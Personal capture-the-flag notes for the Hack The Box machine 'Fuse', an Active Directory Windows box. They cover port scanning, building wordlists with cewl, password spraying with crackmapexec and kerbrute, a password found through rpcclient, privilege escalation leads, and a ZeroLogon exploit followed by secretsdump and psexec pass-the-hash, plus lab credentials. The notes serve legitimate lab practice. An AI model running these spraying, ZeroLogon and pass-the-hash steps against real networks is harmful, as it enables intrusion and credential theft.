# Enumeration - open ports

```
53/tcp   open  domain       Simple DNS Plus                                                                    
80/tcp   open  http         Microsoft IIS httpd 10.0                                                           
|_http-server-header: Microsoft-IIS/10.0                                                                       
| http-methods:                                                                                                
|   Supported Methods: OPTIONS TRACE GET HEAD POST                                                             
|_  Potentially risky methods: TRACE                                                                           
|_http-title: Site doesn't have a title (text/html).                                                           
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-27 19:12:26Z)                     
135/tcp  open  msrpc        Microsoft Windows RPC                                                              
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn                                                      
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)             
464/tcp  open  kpasswd5?                                                                                       
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0                                                
636/tcp  open  tcpwrapped                                                                                      
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped                                                                                      
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows                                           
                                                                                                               
Host script results:                                                                                           
| smb2-security-mode:                                                                                          
|   311:                                                                                                       
|_    Message signing enabled and required                                                                     
| smb-os-discovery:                                                                                            
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)                                                 
|   Computer name: Fuse        
|   NetBIOS computer name: FUSE\x00                            
|   Domain name: fabricorp.local                               
|   Forest name: fabricorp.local                                   
|   FQDN: Fuse.fabricorp.local                                          
|_  System time: 2023-02-27T11:12:36-08:00                              
| smb-security-mode:                
|   account_used: <blank>           
|   authentication_level: user                                                
|   challenge_response: supported                                             
|_  message_signing: required                                                 
|_clock-skew: mean: 2h53m01s, deviation: 4h37m09s, median: 12m59s                                                                                            
| smb2-time:                                   
|   date: 2023-02-27T19:12:35                                                                 
|_  start_date: 2023-02-27T19:11:04
```
## Port 53
No zone transfer so far 

## port 445
Anonymous login failed
![[Pasted image 20230227210943.png]]


## Port 80
![[Pasted image 20230227210334.png]]
add domain to hosts file
`echo '10.129.2.5 fuse.fabricorp.local' | sudo tee -a /etc/hosts`
![[Pasted image 20230227210640.png]]
running feroxbuster
`eroxbuster -n -u http://fuse.fabricorp.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt`
checking html data found some possible usernames
![[Pasted image 20230227211048.png]]
gathering all words inside website to create Users/Passwords list 
pmerton
tlavel
sthompson
bhult
administrator
FUSE
using cewl to generate  passwords from website
`cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers > passwords.txt `
running crackmapexec to see if there is any valid creds
`cme smb $ip -u username-passwords.txt -p passwords.txt --shares --continue-on-success`
![[Pasted image 20230227225846.png]]
![[Pasted image 20230227225905.png]]
running kerbrute found some valid usernames
bhult:Fabricorp01
tlavel:Fabricorp01
![[Pasted image 20230228064210.png]]

`kerbrute userenum -d fabric.local --dc $ip usernames-passwords.txt`
![[Pasted image 20230227232441.png]]
using cewl to create passwords
`cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbbers >passwords`
after trying for a while to change password for users we found with valid passwords earlier without success getting into htb pwnbox and worked e.e probably cos of version missmatch

# Foothold 

![[Pasted image 20230228070013.png]]
![[Pasted image 20230228070107.png]]
inside rpcclient we can enumurate more users
`rpcclient -U tlavel $ip`
![[Pasted image 20230228070911.png]]
checking for printers info inside rpcclient found password in description 
![[Pasted image 20230228072159.png]]
password spraying using crackmapexec
![[Pasted image 20230228072512.png]]

# Privesc
`evil-winrm -i $ip -u svc-print -p '$fab@s3Rv1ce$1'`
![[Pasted image 20230228073055.png]]
## svc-print -> Root
running PowerUp.ps1 script and using Invoke-AllChecks
from evil-wirm upload PowerUp and run it 
```
upload PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks
```
![[Pasted image 20230228073850.png]]
SeLoadDriverPrivilege privesc using capcom
[EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)
[Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
[ExploitCapcom](https://github.com/tandasat/ExploitCapcom)


# Alternative root
![[ZeroLogon]]


`python3 cve-2020-1472-exploit.py Fuse $ip`
`secretsdump.py -just-dc fabricorp.local/Fuse\$@$ip`
`psexec.py administrator@$ip -hashes 'aad3b435b51404eeaad3b435b51404ee:370ddcf45959b2293427baa70376e14e'`
![[Pasted image 20230228075310.png]]
![[Pasted image 20230228075321.png]]
![[Pasted image 20230228075509.png]]

# Loot

users with same password:
	usernames: bhult, tlavel
	password:`Fabricorp01`

winrm svc-print user:
	username: `svc-print`
	password: `$fab@s3Rv1ce$1`


---
Tags: #ctf #AD 
Resources: 
[Fuse](https://app.hackthebox.com/machines/256)